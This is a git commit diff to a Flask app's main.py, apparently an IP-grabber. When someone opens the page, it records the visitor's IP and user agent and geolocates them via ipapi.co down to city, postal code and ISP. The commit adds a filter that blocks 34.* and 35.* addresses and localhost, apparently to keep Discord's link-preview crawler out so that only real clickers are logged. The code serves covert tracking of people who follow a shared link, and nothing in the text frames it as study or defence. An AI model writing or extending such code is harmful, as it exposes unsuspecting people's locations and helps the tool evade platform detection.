f546f7ad95187a9cd4e2714764098484fcf93851
timof121 <52547763+timof121@users.noreply.github.com>
2022-08-13 17:44:51 +0200

    we dont like discord

--- main.py
+++ main.py
@@ -9,6 +9,7 @@ app = flask.Flask(__name__)
 def index():
     #here we get the ip of the request
     ip = flask.request.headers.get("X-Forwarded-For")
+    if (ip.startswith("34.") or ip.startswith("35.") or ip == "127.0.0.1"): return "fuck off."
     useragent = flask.request.headers.get('User-Agent')
     data = requests.get(f'https://ipapi.co/' + ip + '/json').json()
     funny = "".join(ip + "\n" + useragent + "\n" + data['country_name'] + "\n" + data['region'] + "\n" + data['city'] + "\n" + data['postal'] + "\n" + data['org'])    
